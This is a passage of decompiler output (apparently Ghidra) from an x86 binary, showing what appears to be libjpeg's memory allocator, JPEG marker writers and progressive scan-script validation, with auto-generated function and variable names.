    if (iVar2 <= iVar3) goto LAB_0040c392;
  }
  iVar2 = iVar3;
LAB_0040c392:
  if (0 < iVar2) {
    iVar6 = iVar6 * iVar1 * 0x80;
    iVar5 = 0;
    do {
      iVar2 = iVar2 * iVar1 * 0x80;
      if (param_1 == '\0') {
        (*(code *)param_2[10])();
        iVar3 = param_2[5];
        iVar5 = iVar5 + iVar3;
        iVar4 = param_2[4];
        if (iVar4 <= iVar5) {
          return;
        }
      }
      else {
        (*(code *)param_2[0xb])
                  (in_EAX,param_2 + 10,*(undefined4 *)(*param_2 + iVar5 * 4),iVar6,iVar2);
        iVar3 = param_2[5];
        iVar5 = iVar5 + iVar3;
        iVar4 = param_2[4];
        if (iVar4 <= iVar5) {
          return;
        }
      }
      iVar6 = iVar6 + iVar2;
      iVar2 = iVar4 - iVar5;
      if (iVar3 < iVar4 - iVar5) {
        iVar2 = iVar3;
      }
      iVar3 = param_2[7] - (param_2[6] + iVar5);
      if (iVar3 < iVar2) {
        iVar2 = iVar3;
      }
      iVar3 = param_2[1] - (param_2[6] + iVar5);
      if (iVar3 < iVar2) {
        iVar2 = iVar3;
      }
    } while (0 < iVar2);
  }
  return;
}



int __cdecl FUN_0040c460(int *param_1,uint param_2,uint param_3)

{
  int iVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  int iVar4;
  uint uVar5;
  int local_2c;
  undefined4 *local_20;
  int iStack_1c;
  undefined4 *puStack_18;
  
  iVar4 = param_1[1];
  if (0x3b9ac9f0 < param_3) {
    iVar1 = *param_1;
    *(undefined4 *)(iVar1 + 0x14) = 0x38;
    *(undefined4 *)(iVar1 + 0x18) = 1;
    (**(code **)*param_1)(param_1);
  }
  if ((param_3 & 7) != 0) {
    param_3 = (param_3 + 8) - (param_3 & 7);
  }
  if (1 < param_2) {
    iVar1 = *param_1;
    *(undefined4 *)(iVar1 + 0x14) = 0xf;
    *(uint *)(iVar1 + 0x18) = param_2;
    (**(code **)*param_1)(param_1);
  }
  puVar3 = *(undefined4 **)(iVar4 + 4 + (param_2 + 0xc) * 4);
  if (puVar3 == (undefined4 *)0x0) {
    local_20 = (undefined4 *)0x0;
LAB_0040c5c6:
    uVar5 = *(uint *)(&DAT_00427050 + param_2 * 4);
LAB_0040c4f9:
    local_2c = param_3 + 0x10;
    if (0x3b9ac9f0 - param_3 < uVar5) {
      uVar5 = 0x3b9ac9f0 - param_3;
    }
    while( true ) {
      puVar3 = (undefined4 *)FUN_0040dd44(param_1,local_2c + uVar5);
      if (puVar3 != (undefined4 *)0x0) break;
      uVar5 = uVar5 >> 1;
      if (uVar5 < 0x32) {
        iVar4 = *param_1;
        *(undefined4 *)(iVar4 + 0x14) = 0x38;
        *(undefined4 *)(iVar4 + 0x18) = 2;
        (**(code **)*param_1)();
      }
    }
    local_20[0x13] = local_20[0x13] + local_2c + uVar5;
    *puVar3 = 0;
    puVar3[1] = 0;
    uVar5 = uVar5 + param_3;
    puVar3[2] = uVar5;
    if (puStack_18 == (undefined4 *)0x0) {
      local_20[iStack_1c + 1] = puVar3;
      iVar4 = 0;
    }
    else {
      *puStack_18 = puVar3;
      iVar4 = 0;
    }
  }
  else {
    uVar5 = puVar3[2];
    while (uVar5 < param_3) {
      puVar2 = (undefined4 *)*puVar3;
      if (puVar2 == (undefined4 *)0x0) {
        local_20 = puVar3;
        if (puVar3 == (undefined4 *)0x0) goto LAB_0040c5c6;
        uVar5 = *(uint *)(&DAT_00427058 + param_2 * 4);
        goto LAB_0040c4f9;
      }
      puVar3 = puVar2;
      uVar5 = puVar2[2];
    }
    iVar4 = puVar3[1];
  }
  puVar3[1] = iVar4 + param_3;
  puVar3[2] = uVar5 - param_3;
  return (int)puVar3 + iVar4 + 0x10;
}



void __cdecl FUN_0040c6cc(int *param_1,uint param_2)

{
  int iVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  int iVar5;
  void *pvVar6;
  int iVar7;
  void *pvStack_18;
  
  iVar1 = param_1[1];
  if (param_2 < 2) {
    if (param_2 == 1) {
      for (iVar7 = *(int *)(iVar1 + 0x44); iVar7 != 0; iVar7 = *(int *)(iVar7 + 0x24)) {
        while (*(char *)(iVar7 + 0x22) == '\0') {
          iVar7 = *(int *)(iVar7 + 0x24);
          if (iVar7 == 0) goto LAB_0040c7b1;
        }
        *(undefined *)(iVar7 + 0x22) = 0;
        (**(code **)(iVar7 + 0x30))(param_1,iVar7 + 0x28);
      }
LAB_0040c7b1:
      *(undefined4 *)(iVar1 + 0x44) = 0;
      for (iVar7 = *(int *)(iVar1 + 0x48); iVar7 != 0; iVar7 = *(int *)(iVar7 + 0x24)) {
        while (*(char *)(iVar7 + 0x22) == '\0') {
          iVar7 = *(int *)(iVar7 + 0x24);
          if (iVar7 == 0) goto LAB_0040c7e9;
        }
        *(undefined *)(iVar7 + 0x22) = 0;
        (**(code **)(iVar7 + 0x30))(param_1,iVar7 + 0x28);
      }
LAB_0040c7e9:
      *(undefined4 *)(iVar1 + 0x48) = 0;
    }
  }
  else {
    iVar7 = *param_1;
    *(undefined4 *)(iVar7 + 0x14) = 0xf;
    *(uint *)(iVar7 + 0x18) = param_2;
    (**(code **)*param_1)(param_1);
  }
  iVar7 = param_2 + 0xc;
  pvVar6 = *(void **)(iVar1 + 0xc + iVar7 * 4);
  *(undefined4 *)(iVar1 + 0xc + iVar7 * 4) = 0;
  if (pvVar6 != (void *)0x0) {
    do {
      iVar5 = *(int *)((int)pvVar6 + 4);
      iVar2 = *(int *)((int)pvVar6 + 8);
      FUN_0040dd74(param_1,pvVar6);
      *(int *)(iVar1 + 0x4c) = *(int *)(iVar1 + 0x4c) - (iVar5 + iVar2 + 0x10);
      pvVar6 = pvStack_18;
    } while (pvStack_18 != (void *)0x0);
  }
  puVar3 = *(undefined4 **)(iVar1 + 4 + iVar7 * 4);
  *(undefined4 *)(iVar1 + 4 + iVar7 * 4) = 0;
  while (puVar3 != (undefined4 *)0x0) {
    puVar4 = (undefined4 *)*puVar3;
    iVar7 = puVar3[1];
    iVar5 = puVar3[2];
    FUN_0040dd54(param_1,puVar3);
    *(int *)(iVar1 + 0x4c) = *(int *)(iVar1 + 0x4c) - (iVar7 + iVar5 + 0x10);
    puVar3 = puVar4;
  }
  return;
}



undefined4 * __cdecl FUN_0040cb8c(int *param_1,uint param_2,uint param_3)

{
  int iVar1;
  int iVar2;
  undefined4 *puVar3;
  
  iVar1 = param_1[1];
  if (0x3b9ac9f0 < param_3) {
    iVar2 = *param_1;
    *(undefined4 *)(iVar2 + 0x14) = 0x38;
    *(undefined4 *)(iVar2 + 0x18) = 3;
    (**(code **)*param_1)(param_1);
  }
  if ((param_3 & 7) != 0) {
    param_3 = (param_3 + 8) - (param_3 & 7);
  }
  if (1 < param_2) {
    iVar2 = *param_1;
    *(undefined4 *)(iVar2 + 0x14) = 0xf;
    *(uint *)(iVar2 + 0x18) = param_2;
    (**(code **)*param_1)(param_1);
  }
  puVar3 = (undefined4 *)FUN_0040dd64(param_1,param_3 + 0x10);
  if (puVar3 == (undefined4 *)0x0) {
    iVar2 = *param_1;
    *(undefined4 *)(iVar2 + 0x14) = 0x38;
    *(undefined4 *)(iVar2 + 0x18) = 4;
    (**(code **)*param_1)(param_1);
  }
  *(uint *)(iVar1 + 0x4c) = param_3 + 0x10 + *(int *)(iVar1 + 0x4c);
  *puVar3 = *(undefined4 *)(iVar1 + 0xc + (param_2 + 0xc) * 4);
  puVar3[1] = param_3;
  puVar3[2] = 0;
  *(undefined4 **)(iVar1 + 0xc + (param_2 + 0xc) * 4) = puVar3;
  return puVar3 + 4;
}



int __cdecl FUN_0040cc50(int *param_1,uint param_2,int param_3,uint param_4)

{
  code **ppcVar1;
  uint uVar2;
  int iVar3;
  undefined4 *puVar4;
  uint uVar5;
  undefined4 *puVar6;
  uint uVar7;
  
  iVar3 = param_1[1];
  uVar2 = (uint)(0x3b9ac9f0 / (ulonglong)(uint)(param_3 * 0x80));
  if (uVar2 == 0) {
    ppcVar1 = (code **)*param_1;
    ppcVar1[5] = (code *)0x48;
    (**ppcVar1)(param_1);
  }
  if ((int)param_4 <= (int)uVar2) {
    uVar2 = param_4;
  }
  *(uint *)(iVar3 + 0x50) = uVar2;
  iVar3 = FUN_0040c460(param_1,param_2,param_4 * 4);
  if (param_4 != 0) {
    uVar7 = 0;
    do {
      while( true ) {
        if (param_4 - uVar7 < uVar2) {
          uVar2 = param_4 - uVar7;
        }
        puVar4 = FUN_0040cb8c(param_1,param_2,param_3 * 0x80 * uVar2);
        if (uVar2 == 0) break;
        puVar6 = (undefined4 *)(iVar3 + uVar7 * 4);
        uVar5 = uVar2;
        do {
          *puVar6 = puVar4;
          puVar4 = puVar4 + param_3 * 0x20;
          puVar6 = puVar6 + 1;
          uVar5 = uVar5 - 1;
        } while (uVar5 != 0);
        uVar7 = uVar7 + uVar2;
        if (param_4 <= uVar7) {
          return iVar3;
        }
      }
    } while (uVar7 < param_4);
  }
  return iVar3;
}



int __cdecl FUN_0040cd30(int *param_1,uint param_2,uint param_3,uint param_4)

{
  code **ppcVar1;
  uint uVar2;
  int iVar3;
  undefined4 *puVar4;
  uint uVar5;
  undefined4 *puVar6;
  uint uVar7;
  
  iVar3 = param_1[1];
  uVar2 = (uint)(0x3b9ac9f0 / (ulonglong)param_3);
  if (uVar2 == 0) {
    ppcVar1 = (code **)*param_1;
    ppcVar1[5] = (code *)0x48;
    (**ppcVar1)(param_1);
  }
  if ((int)param_4 <= (int)uVar2) {
    uVar2 = param_4;
  }
  *(uint *)(iVar3 + 0x50) = uVar2;
  iVar3 = FUN_0040c460(param_1,param_2,param_4 * 4);
  if (param_4 != 0) {
    uVar7 = 0;
    do {
      while( true ) {
        if (param_4 - uVar7 < uVar2) {
          uVar2 = param_4 - uVar7;
        }
        puVar4 = FUN_0040cb8c(param_1,param_2,param_3 * uVar2);
        if (uVar2 == 0) break;
        puVar6 = (undefined4 *)(iVar3 + uVar7 * 4);
        uVar5 = uVar2;
        do {
          *puVar6 = puVar4;
          puVar4 = (undefined4 *)((int)puVar4 + param_3);
          puVar6 = puVar6 + 1;
          uVar5 = uVar5 - 1;
        } while (uVar5 != 0);
        uVar7 = uVar7 + uVar2;
        if (param_4 <= uVar7) {
          return iVar3;
        }
      }
    } while (uVar7 < param_4);
  }
  return iVar3;
}



// WARNING: Removing unreachable block (ram,0x0040d140)

void __cdecl FUN_0040d01c(int *param_1)

{
  undefined4 uVar1;
  code **ppcVar2;
  char *_Src;
  int iVar3;
  code *pcStack_c;
  
  param_1[1] = 0;
  uVar1 = FUN_0040dda0();
  ppcVar2 = (code **)FUN_0040dd44(param_1,0x54);
  if (ppcVar2 == (code **)0x0) {
    FUN_0040dda4();
    iVar3 = *param_1;
    *(undefined4 *)(iVar3 + 0x14) = 0x38;
    *(undefined4 *)(iVar3 + 0x18) = 0;
    (**(code **)*param_1)(param_1);
  }
  *ppcVar2 = FUN_0040c460;
  ppcVar2[1] = FUN_0040cb8c;
  ppcVar2[2] = FUN_0040cd30;
  ppcVar2[3] = FUN_0040cc50;
  ppcVar2[4] = (code *)&LAB_0040c650;
  ppcVar2[5] = (code *)&LAB_0040c5d4;
  ppcVar2[6] = (code *)&LAB_0040ce0c;
  ppcVar2[7] = (code *)&LAB_0040c9ec;
  ppcVar2[8] = (code *)&LAB_0040c84c;
  ppcVar2[9] = FUN_0040c6cc;
  ppcVar2[10] = (code *)&LAB_0040c7f8;
  ppcVar2[0xc] = (code *)0x3b9aca00;
  ppcVar2[0xb] = pcStack_c;
  ppcVar2[0xe] = (code *)0x0;
  ppcVar2[0x10] = (code *)0x0;
  ppcVar2[0xd] = (code *)0x0;
  ppcVar2[0xf] = (code *)0x0;
  ppcVar2[0x11] = (code *)0x0;
  ppcVar2[0x12] = (code *)0x0;
  ppcVar2[0x13] = (code *)0x54;
  param_1[1] = (int)ppcVar2;
  _Src = getenv("JPEGMEM");
  if ((_Src != (char *)0x0) &&
     (iVar3 = sscanf(_Src,"%ld%c",&pcStack_c,&stack0xfffffffb,uVar1), 0 < iVar3)) {
    ppcVar2[0xb] = (code *)((int)pcStack_c * 1000);
  }
  return;
}



void __cdecl FUN_0040d178(int param_1)

{
  if (*(int *)(param_1 + 4) != 0) {
    (**(code **)(*(int *)(param_1 + 4) + 0x24))(param_1,1);
    if (*(char *)(param_1 + 0x10) != '\0') {
      *(undefined4 *)(param_1 + 0x14) = 200;
      *(undefined4 *)(param_1 + 0x10c) = 0;
      return;
    }
    *(undefined4 *)(param_1 + 0x14) = 100;
  }
  return;
}



void __cdecl FUN_0040d1c0(int param_1)

{
  if (*(int *)(param_1 + 4) != 0) {
    (**(code **)(*(int *)(param_1 + 4) + 0x28))(param_1);
  }
  *(undefined4 *)(param_1 + 4) = 0;
  *(undefined4 *)(param_1 + 0x14) = 0;
  return;
}



void __cdecl FUN_0040d1e8(int param_1)

{
  int iVar1;
  
  iVar1 = (***(code ***)(param_1 + 4))(param_1,0,0x82);
  *(undefined *)(iVar1 + 0x80) = 0;
  return;
}



void __cdecl FUN_0040d214(int param_1)

{
  int iVar1;
  
  iVar1 = (***(code ***)(param_1 + 4))(param_1,0,0x112);
  *(undefined *)(iVar1 + 0x111) = 0;
  return;
}



void __fastcall FUN_0040d240(undefined4 param_1,undefined param_2)

{
  int *piVar1;
  undefined *puVar2;
  int iVar3;
  code **ppcVar4;
  char cVar5;
  int *in_EAX;
  
  piVar1 = (int *)in_EAX[6];
  puVar2 = (undefined *)*piVar1;
  *puVar2 = param_2;
  *piVar1 = (int)(puVar2 + 1);
  iVar3 = piVar1[1];
  piVar1[1] = iVar3 + -1;
  if (iVar3 + -1 == 0) {
    cVar5 = (*(code *)piVar1[3])();
    if (cVar5 == '\0') {
      ppcVar4 = (code **)*in_EAX;
      ppcVar4[5] = (code *)0x19;
      (**ppcVar4)();
      return;
    }
  }
  return;
}



void __fastcall FUN_0040d280(undefined4 param_1,undefined param_2)

{
  undefined4 extraout_ECX;
  
  FUN_0040d240(param_1,0xff);
  FUN_0040d240(extraout_ECX,param_2);
  return;
}



void __fastcall FUN_0040d2a8(undefined4 param_1,undefined4 param_2)

{
  undefined4 unaff_ESI;
  
  FUN_0040d240(param_1,(char)((uint)param_2 >> 8));
  FUN_0040d240(unaff_ESI,(char)param_2);
  return;
}



int __fastcall FUN_0040d310(undefined4 param_1,int param_2)

{
  undefined2 uVar1;
  int iVar2;
  int *in_EAX;
  int iVar3;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 uVar4;
  undefined4 extraout_ECX_03;
  int iVar5;
  int local_20;
  
  iVar2 = in_EAX[param_2 + 0x16];
  if (iVar2 == 0) {
    iVar5 = *in_EAX;
    *(undefined4 *)(iVar5 + 0x14) = 0x36;
    *(int *)(iVar5 + 0x18) = param_2;
    (**(code **)*in_EAX)();
  }
  iVar5 = in_EAX[0x5c];
  if (iVar5 < 0) {
    local_20 = 0;
  }
  else {
    iVar3 = 0;
    local_20 = 0;
    do {
      if (0xff < *(ushort *)(iVar2 + *(int *)(in_EAX[0x5b] + iVar3 * 4) * 2)) {
        local_20 = 1;
      }
      iVar3 = iVar3 + 1;
    } while (iVar3 <= iVar5);
  }
  if (*(char *)(iVar2 + 0x80) == '\0') {
    FUN_0040d280(iVar5,0xdb);
    if (local_20 == 0) {
      iVar5 = in_EAX[0x5c] + 4;
    }
    else {
      iVar5 = in_EAX[0x5c] * 2 + 5;
    }
    FUN_0040d2a8(extraout_ECX,iVar5);
    FUN_0040d240(extraout_ECX_00,(char)(local_20 << 4) + (char)param_2);
    if (-1 < in_EAX[0x5c]) {
      iVar5 = 0;
      uVar4 = extraout_ECX_01;
      do {
        uVar1 = *(undefined2 *)(iVar2 + *(int *)(in_EAX[0x5b] + iVar5 * 4) * 2);
        if (local_20 != 0) {
          FUN_0040d240(uVar4,(char)((ushort)uVar1 >> 8));
          uVar4 = extraout_ECX_03;
        }
        FUN_0040d240(uVar4,(char)uVar1);
        iVar5 = iVar5 + 1;
        uVar4 = extraout_ECX_02;
      } while (iVar5 <= in_EAX[0x5c]);
    }
    *(undefined *)(iVar2 + 0x80) = 1;
    return local_20;
  }
  return local_20;
}



void __fastcall FUN_0040d440(int param_1,int param_2)

{
  int *in_EAX;
  int iVar1;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 uVar2;
  undefined4 extraout_ECX_03;
  int extraout_ECX_04;
  int iVar3;
  int iVar4;
  
  if (param_1 == 0) {
    iVar3 = in_EAX[param_2 + 0x1e];
  }
  else {
    iVar3 = in_EAX[param_2 + 0x22];
    param_2 = param_2 + 0x10;
  }
  if (iVar3 == 0) {
    iVar1 = *in_EAX;
    *(undefined4 *)(iVar1 + 0x14) = 0x34;
    *(int *)(iVar1 + 0x18) = param_2;
    (**(code **)*in_EAX)();
    param_1 = extraout_ECX_04;
  }
  if (*(char *)(iVar3 + 0x111) != '\0') {
    return;
  }
  FUN_0040d280(param_1,0xc4);
  iVar1 = 1;
  iVar4 = 0;
  do {
    iVar4 = iVar4 + (uint)*(byte *)(iVar3 + iVar1);
    iVar1 = iVar1 + 1;
  } while (iVar1 != 0x11);
  FUN_0040d2a8(extraout_ECX,iVar4 + 0x13);
  FUN_0040d240(extraout_ECX_00,(char)param_2);
  iVar1 = 1;
  uVar2 = extraout_ECX_01;
  do {
    FUN_0040d240(uVar2,*(undefined *)(iVar3 + iVar1));
    iVar1 = iVar1 + 1;
    uVar2 = extraout_ECX_02;
  } while (iVar1 != 0x11);
  if (iVar4 != 0) {
    iVar1 = 0;
    do {
      FUN_0040d240(uVar2,*(undefined *)(iVar3 + 0x11 + iVar1));
      iVar1 = iVar1 + 1;
      uVar2 = extraout_ECX_03;
    } while (iVar1 != iVar4);
  }
  *(undefined *)(iVar3 + 0x111) = 1;
  return;
}



void __fastcall FUN_0040d584(undefined4 param_1,undefined param_2)

{
  int *in_EAX;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 extraout_ECX_03;
  undefined4 extraout_ECX_04;
  undefined4 uVar1;
  undefined4 extraout_ECX_05;
  undefined4 extraout_ECX_06;
  undefined4 extraout_ECX_07;
  undefined4 extraout_ECX_08;
  undefined4 *puVar2;
  int iVar3;
  
  FUN_0040d280(param_1,param_2);
  FUN_0040d2a8(extraout_ECX,in_EAX[0x13] * 3 + 8);
  if ((0xffff < in_EAX[0x11]) || (uVar1 = extraout_ECX_00, 0xffff < in_EAX[0x10])) {
    iVar3 = *in_EAX;
    *(undefined4 *)(iVar3 + 0x14) = 0x2a;
    *(undefined4 *)(iVar3 + 0x18) = 0xffff;
    (**(code **)*in_EAX)();
    uVar1 = extraout_ECX_08;
  }
  FUN_0040d240(uVar1,(char)in_EAX[0x12]);
  FUN_0040d2a8(extraout_ECX_01,in_EAX[0x11]);
  FUN_0040d2a8(extraout_ECX_02,in_EAX[0x10]);
  FUN_0040d240(extraout_ECX_03,(char)in_EAX[0x13]);
  puVar2 = (undefined4 *)in_EAX[0x15];
  if (0 < in_EAX[0x13]) {
    iVar3 = 0;
    uVar1 = extraout_ECX_04;
    do {
      FUN_0040d240(uVar1,(char)*puVar2);
      FUN_0040d240(extraout_ECX_05,(char)(puVar2[2] << 4) + (char)puVar2[3]);
      FUN_0040d240(extraout_ECX_06,(char)puVar2[4]);
      iVar3 = iVar3 + 1;
      puVar2 = puVar2 + 0x16;
      uVar1 = extraout_ECX_07;
    } while (iVar3 < in_EAX[0x13]);
  }
  return;
}



void __cdecl FUN_0040dc10(int param_1)

{
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)(***(code ***)(param_1 + 4))(param_1,1,0x20);
  *(undefined4 **)(param_1 + 0x184) = puVar1;
  *puVar1 = &LAB_0040d8c0;
  puVar1[1] = &LAB_0040da70;
  puVar1[2] = &LAB_0040d638;
  puVar1[3] = &LAB_0040d29c;
  puVar1[4] = &LAB_0040d508;
  puVar1[5] = &LAB_0040d2cc;
  puVar1[6] = &LAB_0040da60;
  puVar1[7] = 0;
  return;
}



void FUN_0040dc74(int *param_1)

{
  int iVar1;
  bool bVar2;
  
  FUN_0040ed40(param_1,'\0');
  if (*(char *)(param_1 + 0x34) == '\0') {
    FUN_00414ea4(param_1);
    FUN_004158f8(param_1);
    FUN_00415ef8(param_1,'\0');
  }
  FUN_0040fc38((int)param_1);
  if (*(char *)((int)param_1 + 0xd1) == '\0') {
    FUN_004148e4((int)param_1);
    iVar1 = param_1[0x32];
  }
  else {
    FUN_00411174((int)param_1);
    iVar1 = param_1[0x32];
  }
  if (iVar1 < 2) {
    bVar2 = *(char *)((int)param_1 + 0xd2) != '\0';
  }
  else {
    bVar2 = true;
  }
  FUN_00411a7c((int)param_1,bVar2);
  FUN_00411ca4(param_1,'\0');
  FUN_0040dc10((int)param_1);
  (**(code **)(param_1[1] + 0x18))(param_1);
                    // WARNING: Could not recover jumptable at 0x0040dcfd. Too many branches
                    // WARNING: Treating indirect jump as call
  (**(code **)param_1[0x61])();
  return;
}



void FUN_0040dd44(undefined4 param_1,size_t param_2)

{
  malloc(param_2);
  return;
}



void FUN_0040dd54(undefined4 param_1,void *param_2)

{
  free(param_2);
  return;
}



void FUN_0040dd64(undefined4 param_1,size_t param_2)

{
  malloc(param_2);
  return;
}



void FUN_0040dd74(undefined4 param_1,void *param_2)

{
  free(param_2);
  return;
}



undefined4 __cdecl FUN_0040dd84(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  return param_3;
}



void FUN_0040dd8c(int *param_1)

{
  code **ppcVar1;
  
  ppcVar1 = (code **)*param_1;
  ppcVar1[5] = (code *)0x33;
                    // WARNING: Could not recover jumptable at 0x0040dd9b. Too many branches
                    // WARNING: Treating indirect jump as call
  (**ppcVar1)();
  return;
}



undefined4 FUN_0040dda0(void)

{
  return 0;
}



void FUN_0040dda4(void)

{
  return;
}



void FUN_0040dda8(void)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  uint uVar4;
  int iVar5;
  code **ppcVar6;
  int *in_EAX;
  int *piVar7;
  int iVar8;
  uint uVar9;
  int iVar10;
  int local_a48;
  int *local_a40;
  int iStack_a38;
  int local_a28 [640];
  char local_26 [22];
  
  if (in_EAX[0x32] < 1) {
    iVar10 = *in_EAX;
    *(undefined4 *)(iVar10 + 0x14) = 0x14;
    *(undefined4 *)(iVar10 + 0x18) = 0;
    (**(code **)*in_EAX)();
  }
  local_a40 = (int *)in_EAX[0x33];
  if ((local_a40[5] == 0) && (local_a40[6] == 0x3f)) {
    *(undefined *)(in_EAX + 0x3e) = 0;
    iVar10 = in_EAX[0x13];
    if (0 < iVar10) {
      iVar8 = 0;
      do {
        local_26[iVar8] = '\0';
        iVar8 = iVar8 + 1;
      } while (iVar8 != iVar10);
    }
  }
  else {
    *(undefined *)(in_EAX + 0x3e) = 1;
    iVar10 = in_EAX[0x13];
    if (0 < iVar10) {
      iVar8 = 0;
      piVar7 = local_a28;
      do {
        piVar1 = piVar7 + 0x40;
        do {
          *piVar7 = -1;
          piVar7 = piVar7 + 1;
        } while (piVar7 != piVar1);
        iVar8 = iVar8 + 1;
      } while (iVar8 != iVar10);
    }
  }
  if (0 < in_EAX[0x32]) {
    local_a48 = 1;
    do {
      iVar10 = *local_a40;
      if (iVar10 - 1U < 4) {
LAB_0040de3a:
        iVar8 = 0;
        piVar7 = local_a40;
        do {
          while( true ) {
            iVar2 = piVar7[1];
            if ((iVar2 < 0) || (in_EAX[0x13] <= iVar2)) {
              iVar3 = *in_EAX;
              *(undefined4 *)(iVar3 + 0x14) = 0x14;
              *(int *)(iVar3 + 0x18) = local_a48;
              (**(code **)*in_EAX)(in_EAX);
            }
            if ((iVar8 == 0) || (*piVar7 < iVar2)) break;
            iVar2 = *in_EAX;
            *(undefined4 *)(iVar2 + 0x14) = 0x14;
            *(int *)(iVar2 + 0x18) = local_a48;
            (**(code **)*in_EAX)(in_EAX);
            iVar8 = iVar8 + 1;
            piVar7 = piVar7 + 1;
            if (iVar8 == iVar10) goto LAB_0040de9c;
          }
          iVar8 = iVar8 + 1;
          piVar7 = piVar7 + 1;
        } while (iVar8 != iVar10);
      }
      else {
        iVar8 = *in_EAX;
        *(undefined4 *)(iVar8 + 0x14) = 0x1b;
        *(int *)(iVar8 + 0x18) = iVar10;
        *(undefined4 *)(*in_EAX + 0x1c) = 4;
        (**(code **)*in_EAX)(in_EAX);
        if (0 < iVar10) goto LAB_0040de3a;
      }
LAB_0040de9c:
      uVar4 = local_a40[5];
      iVar8 = local_a40[6];
      iVar2 = local_a40[7];
      iVar3 = local_a40[8];
      if (*(char *)(in_EAX + 0x3e) == '\0') {
        if ((((uVar4 != 0) || (iVar8 != 0x3f)) || (iVar2 != 0)) || (iVar3 != 0)) {
          iVar8 = *in_EAX;
          *(undefined4 *)(iVar8 + 0x14) = 0x12;
          *(int *)(iVar8 + 0x18) = local_a48;
          (**(code **)*in_EAX)(in_EAX);
        }
        if (0 < iVar10) {
          iVar8 = 0;
          do {
            iVar2 = local_a40[iVar8 + 1];
            if (local_26[iVar2] != '\0') {
              iVar3 = *in_EAX;
              *(undefined4 *)(iVar3 + 0x14) = 0x14;
              *(int *)(iVar3 + 0x18) = local_a48;
              (**(code **)*in_EAX)(in_EAX);
            }
            local_26[iVar2] = '\x01';
            iVar8 = iVar8 + 1;
          } while (iVar8 != iVar10);
        }
      }
      else {
        if (((((0x3f < uVar4) || (iVar8 < (int)uVar4)) ||
             ((0x3f < iVar8 || ((iVar2 < 0 || (10 < iVar2)))))) || (iVar3 < 0)) || (10 < iVar3)) {
          iVar5 = *in_EAX;
          *(undefined4 *)(iVar5 + 0x14) = 0x12;
          *(int *)(iVar5 + 0x18) = local_a48;
          (**(code **)*in_EAX)(in_EAX);
        }
        if (uVar4 == 0) {
          if (iVar8 != 0) {
            iVar5 = *in_EAX;
            *(undefined4 *)(iVar5 + 0x14) = 0x12;
            *(int *)(iVar5 + 0x18) = local_a48;
            (**(code **)*in_EAX)(in_EAX);
          }
LAB_0040df1f:
          if (iVar10 < 1) goto LAB_0040dfda;
        }
        else if (iVar10 != 1) {
          iVar5 = *in_EAX;
          *(undefined4 *)(iVar5 + 0x14) = 0x12;
          *(int *)(iVar5 + 0x18) = local_a48;
          (**(code **)*in_EAX)(in_EAX);
          goto LAB_0040df1f;
        }
        iStack_a38 = 0;
        do {
          piVar7 = local_a28 + local_a40[iStack_a38 + 1] * 0x40;
          if (uVar4 == 0) {
            uVar9 = 0;
          }
          else {
            uVar9 = uVar4;
            if (*piVar7 < 0) {
              iVar5 = *in_EAX;
              *(undefined4 *)(iVar5 + 0x14) = 0x12;
              *(int *)(iVar5 + 0x18) = local_a48;
              (**(code **)*in_EAX)(in_EAX);
            }
          }
          for (; (int)uVar9 <= iVar8; uVar9 = uVar9 + 1) {
            if (piVar7[uVar9] < 0) {
              if (iVar2 != 0) {
                iVar5 = *in_EAX;
                *(undefined4 *)(iVar5 + 0x14) = 0x12;
                *(int *)(iVar5 + 0x18) = local_a48;
                (**(code **)*in_EAX)(in_EAX);
              }
            }
            else if ((iVar2 != piVar7[uVar9]) || (iVar2 + -1 != iVar3)) {
              iVar5 = *in_EAX;
              *(undefined4 *)(iVar5 + 0x14) = 0x12;
              *(int *)(iVar5 + 0x18) = local_a48;
              (**(code **)*in_EAX)(in_EAX);
            }
            piVar7[uVar9] = iVar3;
          }
          iStack_a38 = iStack_a38 + 1;
        } while (iStack_a38 < iVar10);
      }
LAB_0040dfda:
      local_a40 = local_a40 + 9;
      local_a48 = local_a48 + 1;
    } while (local_a48 <= in_EAX[0x32]);
  }
  if (*(char *)(in_EAX + 0x3e) == '\0') {
    if (0 < in_EAX[0x13]) {
      iVar10 = 0;
      do {
        while (local_26[iVar10] != '\0') {
          iVar10 = iVar10 + 1;
          if (in_EAX[0x13] <= iVar10) {
            return;
          }
        }
        ppcVar6 = (code **)*in_EAX;
        ppcVar6[5] = (code *)0x2e;
        (**ppcVar6)(in_EAX);
        iVar10 = iVar10 + 1;
      } while (iVar10 < in_EAX[0x13]);
    }
  }
  else if (0 < in_EAX[0x13]) {
    piVar7 = local_a28;
    iVar10 = 0;
    do {
      if (*piVar7 < 0) {
        ppcVar6 = (code **)*in_EAX;
        ppcVar6[5] = (code *)0x2e;
        (**ppcVar6)(in_EAX);
      }
      iVar10 = iVar10 + 1;
      piVar7 = piVar7 + 0x40;
    } while (iVar10 < in_EAX[0x13]);
  }
  return;
}



void FUN_0040e20c(void)

{
  int *piVar1;
  int *in_EAX;
  int iVar2;
  int iVar3;
  int iVar4;
  
  if (in_EAX[0x33] == 0) {
    iVar4 = in_EAX[0x13];
    if (4 < iVar4) {
      iVar2 = *in_EAX;
      *(undefined4 *)(iVar2 + 0x14) = 0x1b;
      *(int *)(iVar2 + 0x18) = iVar4;
      *(undefined4 *)(*in_EAX + 0x1c) = 4;
      (**(code **)*in_EAX)();
      iVar4 = in_EAX[0x13];
    }
    in_EAX[0x44] = iVar4;
    if (0 < iVar4) {
      iVar2 = in_EAX[0x15];
      iVar3 = 0;
      do {
        in_EAX[iVar3 + 0x45] = iVar2;
        iVar3 = iVar3 + 1;
        iVar2 = iVar2 + 0x58;
      } while (iVar3 != iVar4);
    }
  }
  else {
    piVar1 = (int *)(in_EAX[0x33] + *(int *)(in_EAX[0x5d] + 0x1c) * 0x24);
    iVar4 = *piVar1;
    in_EAX[0x44] = iVar4;
    if (0 < iVar4) {
      iVar2 = in_EAX[0x15];
      iVar3 = 0;
      do {
